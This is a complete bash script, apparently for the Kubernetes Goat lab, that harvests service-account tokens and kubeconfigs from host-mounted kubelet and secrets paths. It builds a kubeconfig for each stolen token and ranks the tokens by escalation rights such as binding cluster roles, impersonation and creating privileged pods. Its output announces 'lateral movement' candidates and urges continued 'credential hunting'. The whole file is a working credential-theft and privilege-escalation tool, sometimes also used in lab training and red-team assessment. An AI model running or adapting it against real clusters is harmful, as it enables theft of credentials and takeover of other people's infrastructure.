#!/usr/bin/env bash
set -euo pipefail

SEED_KUBECONFIG="/etc/kubernetes/kubeconfig"
REQUEST_TIMEOUT="8s"
USE_INSECURE="false"
KEEP_WORKDIR="false"
MAX_TOKENS=300
SCAN_MAX_DEPTH=12
MAX_SOURCE_FILES_PER_DIR=8000
FIND_TIMEOUT="45s"
CHECK_PROFILE="quick"

declare -a SCAN_DIRS=(
  "/var/lib/kubelet/pods"
  "/var/run/secrets"
  "/etc/kubernetes"
  "/host-system/var/lib/kubelet/pods"
  "/host-system/var/run/secrets"
  "/host-system/etc/kubernetes"
)

declare -a EXTRA_TOKEN_FILES=()
declare -a EXTRA_KUBECONFIG_FILES=()

usage() {
  cat <<'EOF'
Usage:
  bash token-permission-audit.sh [options]

Options:
  --seed-kubeconfig <path>     Base kubeconfig for API server/CA info (default: /etc/kubernetes/kubeconfig)
  --scan-dir <path>            Add directory to scan (can be repeated)
  --token-file <path>          Add explicit token file (can be repeated)
  --kubeconfig-file <path>     Add explicit kubeconfig file to extract tokens from (can be repeated)
  --request-timeout <duration> kubectl request timeout (default: 8s)
  --max-tokens <number>        Safety limit for number of distinct tokens to evaluate (default: 300)
  --scan-max-depth <number>    Max directory depth for file scanning (default: 12)
  --max-source-files <number>  Max discovered files per scan-dir before truncation (default: 8000)
  --find-timeout <duration>    Timeout per find command, e.g., 45s, 2m (default: 45s)
  --thorough                   Run full permission check set (slower)
  --insecure-skip-tls-verify   Use insecure TLS for generated kubeconfigs
  --keep-workdir               Keep temporary output directory
  -h, --help                   Show this help

Examples:
  bash token-permission-audit.sh
  bash token-permission-audit.sh --scan-dir /host-system/var/lib/kubelet/pods
  bash token-permission-audit.sh --token-file /tmp/token
  bash token-permission-audit.sh --thorough --request-timeout 5s
EOF
}

while [[ $# -gt 0 ]]; do
  case "$1" in
    --seed-kubeconfig)
      SEED_KUBECONFIG="$2"
      shift 2
      ;;
    --scan-dir)
      SCAN_DIRS+=("$2")
      shift 2
      ;;
    --token-file)
      EXTRA_TOKEN_FILES+=("$2")
      shift 2
      ;;
    --kubeconfig-file)
      EXTRA_KUBECONFIG_FILES+=("$2")
      shift 2
      ;;
    --request-timeout)
      REQUEST_TIMEOUT="$2"
      shift 2
      ;;
    --max-tokens)
      MAX_TOKENS="$2"
      shift 2
      ;;
    --scan-max-depth)
      SCAN_MAX_DEPTH="$2"
      shift 2
      ;;
    --max-source-files)
      MAX_SOURCE_FILES_PER_DIR="$2"
      shift 2
      ;;
    --find-timeout)
      FIND_TIMEOUT="$2"
      shift 2
      ;;
    --thorough)
      CHECK_PROFILE="thorough"
      shift
      ;;
    --insecure-skip-tls-verify)
      USE_INSECURE="true"
      shift
      ;;
    --keep-workdir)
      KEEP_WORKDIR="true"
      shift
      ;;
    -h|--help)
      usage
      exit 0
      ;;
    *)
      echo "[!] Unknown argument: $1" >&2
      usage
      exit 1
      ;;
  esac
done

if ! command -v kubectl >/dev/null 2>&1; then
  echo "[!] kubectl is required but not found in PATH." >&2
  exit 1
fi

if ! [[ "$MAX_TOKENS" =~ ^[0-9]+$ ]]; then
  echo "[!] --max-tokens must be a number." >&2
  exit 1
fi

if ! [[ "$SCAN_MAX_DEPTH" =~ ^[0-9]+$ ]]; then
  echo "[!] --scan-max-depth must be a number." >&2
  exit 1
fi

if ! [[ "$MAX_SOURCE_FILES_PER_DIR" =~ ^[0-9]+$ ]]; then
  echo "[!] --max-source-files must be a number." >&2
  exit 1
fi

if [[ ! -f "$SEED_KUBECONFIG" ]]; then
  echo "[!] Seed kubeconfig not found: $SEED_KUBECONFIG" >&2
  exit 1
fi

SERVER="$(kubectl config view --kubeconfig "$SEED_KUBECONFIG" --minify -o jsonpath='{.clusters[0].cluster.server}' 2>/dev/null || true)"
CA_DATA="$(kubectl config view --kubeconfig "$SEED_KUBECONFIG" --minify -o jsonpath='{.clusters[0].cluster.certificate-authority-data}' 2>/dev/null || true)"
SEED_INSECURE="$(kubectl config view --kubeconfig "$SEED_KUBECONFIG" --minify -o jsonpath='{.clusters[0].cluster.insecure-skip-tls-verify}' 2>/dev/null || true)"

if [[ -z "$SERVER" ]]; then
  echo "[!] Unable to read API server from seed kubeconfig: $SEED_KUBECONFIG" >&2
  exit 1
fi

if [[ "$USE_INSECURE" == "false" && "$SEED_INSECURE" == "true" ]]; then
  USE_INSECURE="true"
fi

if [[ "$USE_INSECURE" == "false" && -z "$CA_DATA" ]]; then
  echo "[i] No CA data found in seed kubeconfig, switching to insecure TLS mode."
  USE_INSECURE="true"
fi

WORKDIR="/tmp/k8s-goat-token-audit-$(date +%Y%m%d-%H%M%S)-$$"
mkdir -p "$WORKDIR"

if [[ "$KEEP_WORKDIR" != "true" ]]; then
  trap 'rm -rf "$WORKDIR"' EXIT
fi

declare -A SOURCE_SEEN=()
declare -a TOKEN_FILES=()
declare -a KUBECONFIG_FILES=()

add_source_file() {
  local path="$1"
  local kind="$2"

  if [[ ! -f "$path" || ! -r "$path" ]]; then
    return
  fi

  local key="${kind}:${path}"
  if [[ -n "${SOURCE_SEEN[$key]:-}" ]]; then
    return
  fi
  SOURCE_SEEN[$key]=1

  if [[ "$kind" == "token" ]]; then
    TOKEN_FILES+=("$path")
  else
    KUBECONFIG_FILES+=("$path")
  fi
}

run_find() {
  local dir="$1"
  shift

  if command -v timeout >/dev/null 2>&1; then
    timeout "$FIND_TIMEOUT" find "$dir" "$@" 2>/dev/null || true
  else
    find "$dir" "$@" 2>/dev/null || true
  fi
}

echo "[i] Starting source discovery..."

for dir in "${SCAN_DIRS[@]}"; do
  if [[ -d "$dir" ]]; then
    echo "[i] Scanning dir: $dir"
    before_tokens="${#TOKEN_FILES[@]}"
    before_kubeconfigs="${#KUBECONFIG_FILES[@]}"

    if [[ "$dir" == *"/var/lib/kubelet/pods"* ]]; then
      while IFS= read -r file; do
        add_source_file "$file" "token"
      done < <(run_find "$dir" -maxdepth "$SCAN_MAX_DEPTH" -type f \( -path '*/volumes/kubernetes.io~projected/*/token' -o -path '*/volumes/kubernetes.io~secret/*/token' -o -name token -o -name '*.token' \) | head -n "$MAX_SOURCE_FILES_PER_DIR")

      while IFS= read -r file; do
        add_source_file "$file" "kubeconfig"
      done < <(run_find "$dir" -maxdepth "$SCAN_MAX_DEPTH" -type f \( -name kubeconfig -o -name '*.kubeconfig' \) | head -n "$MAX_SOURCE_FILES_PER_DIR")
    elif [[ "$dir" == *"/var/run/secrets"* ]]; then
      while IFS= read -r file; do
        add_source_file "$file" "token"
      done < <(run_find "$dir" -maxdepth "$SCAN_MAX_DEPTH" -type f \( -path '*/kubernetes.io/serviceaccount/token' -o -name token -o -name '*.token' \) | head -n "$MAX_SOURCE_FILES_PER_DIR")

      while IFS= read -r file; do
        add_source_file "$file" "kubeconfig"
      done < <(run_find "$dir" -maxdepth "$SCAN_MAX_DEPTH" -type f \( -name kubeconfig -o -name '*.kubeconfig' \) | head -n "$MAX_SOURCE_FILES_PER_DIR")
    else
      while IFS= read -r file; do
        add_source_file "$file" "token"
      done < <(run_find "$dir" -maxdepth "$SCAN_MAX_DEPTH" -type f \( -name token -o -name '*.token' \) | head -n "$MAX_SOURCE_FILES_PER_DIR")

      while IFS= read -r file; do
        add_source_file "$file" "kubeconfig"
      done < <(run_find "$dir" -maxdepth "$SCAN_MAX_DEPTH" -type f \( -name kubeconfig -o -name '*.kubeconfig' \) | head -n "$MAX_SOURCE_FILES_PER_DIR")
    fi

    found_tokens=$(( ${#TOKEN_FILES[@]} - before_tokens ))
    found_kubeconfigs=$(( ${#KUBECONFIG_FILES[@]} - before_kubeconfigs ))
    echo "[i] Scan dir: $dir -> token files: $found_tokens, kubeconfigs: $found_kubeconfigs"
  fi
done

for file in "${EXTRA_TOKEN_FILES[@]}"; do
  add_source_file "$file" "token"
done

for file in "${EXTRA_KUBECONFIG_FILES[@]}"; do
  add_source_file "$file" "kubeconfig"
done

declare -A TOKEN_INDEX=()
declare -a TOKENS=()
declare -a TOKEN_SOURCES=()
declare -a TOKEN_IDS=()

add_token() {
  local token="$1"
  local source="$2"
  token="$(printf '%s' "$token" | tr -d '\r\n[:space:]')"

  if [[ -z "$token" || ${#token} -lt 20 ]]; then
    return
  fi

  local token_id
  token_id="$(printf '%s' "$token" | sha256sum | awk '{print substr($1,1,12)}')"

  if [[ -n "${TOKEN_INDEX[$token_id]:-}" ]]; then
    local idx="${TOKEN_INDEX[$token_id]}"
    case "|${TOKEN_SOURCES[$idx]}|" in
      *"|$source|"*) ;;
      *) TOKEN_SOURCES[$idx]="${TOKEN_SOURCES[$idx]}|$source" ;;
    esac
    return
  fi

  local idx="${#TOKENS[@]}"
  TOKEN_INDEX[$token_id]="$idx"
  TOKENS+=("$token")
  TOKEN_SOURCES+=("$source")
  TOKEN_IDS+=("$token_id")
}

for file in "${TOKEN_FILES[@]}"; do
  token_value="$(tr -d '\r\n' < "$file" 2>/dev/null || true)"
  if [[ -n "$token_value" ]]; then
    add_token "$token_value" "$file"
  fi
done

for file in "${KUBECONFIG_FILES[@]}"; do
  extracted="$(kubectl config view --kubeconfig "$file" --raw -o jsonpath='{..token}' 2>/dev/null || true)"
  if [[ -n "$extracted" ]]; then
    for token in $extracted; do
      add_token "$token" "$file(token)"
    done
  fi
done

if [[ ${#TOKENS[@]} -eq 0 ]]; then
  echo "[!] No token candidates found from configured paths."
  echo "[i] Add more paths with --scan-dir or pass explicit files via --token-file/--kubeconfig-file."
  exit 1
fi

if [[ ${#TOKENS[@]} -gt MAX_TOKENS ]]; then
  echo "[i] Found ${#TOKENS[@]} distinct tokens. Limiting evaluation to first $MAX_TOKENS for safety."
fi

make_kubeconfig_for_token() {
  local token="$1"
  local out="$2"

  {
    echo "apiVersion: v1"
    echo "kind: Config"
    echo "clusters:"
    echo "- name: target"
    echo "  cluster:"
    echo "    server: $SERVER"
    if [[ "$USE_INSECURE" == "true" ]]; then
      echo "    insecure-skip-tls-verify: true"
    else
      echo "    certificate-authority-data: $CA_DATA"
    fi
    echo "users:"
    echo "- name: audited-token"
    echo "  user:"
    echo "    token: $token"
    echo "contexts:"
    echo "- name: audit"
    echo "  context:"
    echo "    cluster: target"
    echo "    user: audited-token"
    echo "current-context: audit"
  } > "$out"
}

declare -a CHECKS_QUICK=(
  "50::create clusterrolebindings.rbac.authorization.k8s.io::create-clusterrolebindings"
  "45::escalate clusterroles.rbac.authorization.k8s.io::escalate-clusterroles"
  "45::bind clusterroles.rbac.authorization.k8s.io::bind-clusterroles"
  "40::approve certificatesigningrequests.certificates.k8s.io::approve-csrs"
  "35::impersonate users::impersonate-users"
  "30::--all-namespaces create daemonsets.apps::create-daemonsets-all-ns"
  "25::--all-namespaces create pods::create-pods-all-ns"
  "25::patch nodes::patch-nodes"
  "25::use securitycontextconstraints.security.openshift.io privileged::use-scc-privileged"
  "15::--all-namespaces list secrets::list-secrets-all-ns"
)

declare -a CHECKS_THOROUGH=(
  "50::create clusterrolebindings.rbac.authorization.k8s.io::create-clusterrolebindings"
  "45::escalate clusterroles.rbac.authorization.k8s.io::escalate-clusterroles"
  "45::bind clusterroles.rbac.authorization.k8s.io::bind-clusterroles"
  "40::approve certificatesigningrequests.certificates.k8s.io::approve-csrs"
  "35::impersonate users::impersonate-users"
  "35::impersonate groups::impersonate-groups"
  "30::--all-namespaces create daemonsets.apps::create-daemonsets-all-ns"
  "25::--all-namespaces create pods::create-pods-all-ns"
  "25::patch nodes::patch-nodes"
  "25::update nodes::update-nodes"
  "25::use securitycontextconstraints.security.openshift.io privileged::use-scc-privileged"
  "20::--all-namespaces create deployments.apps::create-deployments-all-ns"
  "15::--all-namespaces get secrets::get-secrets-all-ns"
  "15::--all-namespaces list secrets::list-secrets-all-ns"
  "10::--all-namespaces create pods/exec::create-pods-exec-all-ns"
  "10::--all-namespaces create pods/ephemeralcontainers::create-ephemeralcontainers-all-ns"
  "10::create certificatesigningrequests.certificates.k8s.io::create-csrs"
  "10::get nodes::get-nodes"
  "10::list nodes::list-nodes"
)

declare -a CHECKS=()
if [[ "$CHECK_PROFILE" == "thorough" ]]; then
  CHECKS=("${CHECKS_THOROUGH[@]}")
else
  CHECKS=("${CHECKS_QUICK[@]}")
fi

RESULTS_TSV="$WORKDIR/results.tsv"
echo -e "score\tidentity\ttoken_id\tsource\thits" > "$RESULTS_TSV"

echo "[i] Distinct tokens found: ${#TOKENS[@]}"
echo "[i] Evaluating token permissions against: $SERVER"
echo "[i] Permission check profile: $CHECK_PROFILE (${#CHECKS[@]} checks per token)"

limit="${#TOKENS[@]}"
if [[ "$limit" -gt "$MAX_TOKENS" ]]; then
  limit="$MAX_TOKENS"
fi

for ((i=0; i<limit; i++)); do
  token="${TOKENS[$i]}"
  token_id="${TOKEN_IDS[$i]}"
  source="${TOKEN_SOURCES[$i]}"

  cfg="$WORKDIR/kubeconfig-$i.yaml"
  make_kubeconfig_for_token "$token" "$cfg"

  echo "[i] Auditing token $((i+1))/$limit (token_id=$token_id)"

  whoami="$(kubectl --kubeconfig "$cfg" --request-timeout="$REQUEST_TIMEOUT" auth whoami 2>/dev/null || true)"
  if [[ -z "$whoami" ]]; then
    probe="$(kubectl --kubeconfig "$cfg" --request-timeout="$REQUEST_TIMEOUT" get nodes 2>&1 || true)"
    whoami="$(printf '%s' "$probe" | sed -n 's/.*User "\([^"]*\)".*/\1/p' | head -n1)"
  fi
  if [[ -z "$whoami" ]]; then
    whoami="unknown"
  fi

  score=0
  hits=""

  for entry in "${CHECKS[@]}"; do
    weight="${entry%%::*}"
    rest="${entry#*::}"
    query="${rest%%::*}"
    name="${rest##*::}"

    ans="$(eval "kubectl --kubeconfig \"$cfg\" --request-timeout=\"$REQUEST_TIMEOUT\" auth can-i $query" 2>/dev/null | tr -d '\r' || true)"
    if [[ "$ans" == "yes" ]]; then
      score=$((score + weight))
      if [[ -z "$hits" ]]; then
        hits="$name"
      else
        hits="$hits,$name"
      fi
    fi
  done

  safe_source="$(printf '%s' "$source" | tr '\t\n\r' ' ' )"
  safe_hits="$(printf '%s' "$hits" | tr '\t\n\r' ' ' )"
  safe_identity="$(printf '%s' "$whoami" | tr '\t\n\r' ' ' )"

  echo -e "${score}\t${safe_identity}\t${token_id}\t${safe_source}\t${safe_hits}" >> "$RESULTS_TSV"

  printf '[%d/%d] token_id=%s score=%d identity=%s\n' "$((i+1))" "$limit" "$token_id" "$score" "$safe_identity"
done

RANKED_TSV="$WORKDIR/ranked.tsv"
{
  head -n1 "$RESULTS_TSV"
  tail -n +2 "$RESULTS_TSV" | sort -t $'\t' -k1,1nr
} > "$RANKED_TSV"

echo
echo "=== Top Candidates (by score) ==="
awk -F '\t' 'NR==1 {printf "%-7s %-45s %-14s %s\n", "SCORE", "IDENTITY", "TOKEN_ID", "SOURCE"; next} NR<=11 {printf "%-7s %-45s %-14s %s\n", $1, $2, $3, $4}' "$RANKED_TSV"

best_score="$(awk -F '\t' 'NR==2 {print $1}' "$RANKED_TSV")"
best_identity="$(awk -F '\t' 'NR==2 {print $2}' "$RANKED_TSV")"
best_token_id="$(awk -F '\t' 'NR==2 {print $3}' "$RANKED_TSV")"
best_source="$(awk -F '\t' 'NR==2 {print $4}' "$RANKED_TSV")"
best_hits="$(awk -F '\t' 'NR==2 {print $5}' "$RANKED_TSV")"

echo
echo "=== Best Token Candidate ==="
echo "score      : ${best_score:-0}"
echo "identity   : ${best_identity:-unknown}"
echo "token_id   : ${best_token_id:-none}"
echo "source     : ${best_source:-none}"
echo "hit_checks : ${best_hits:-none}"

if [[ -n "${best_score:-}" ]] && [[ "$best_score" -ge 30 ]]; then
  echo "[+] High-potential lateral movement token found (score >= 30). Review hit_checks and validate manually."
else
  echo "[-] No strong lateral movement token identified by current checks. Continue credential hunting and rerun."
fi

if [[ "$KEEP_WORKDIR" == "true" ]]; then
  echo "[i] Detailed output retained at: $WORKDIR"
else
  echo "[i] Use --keep-workdir if you want to retain detailed output files."
fi
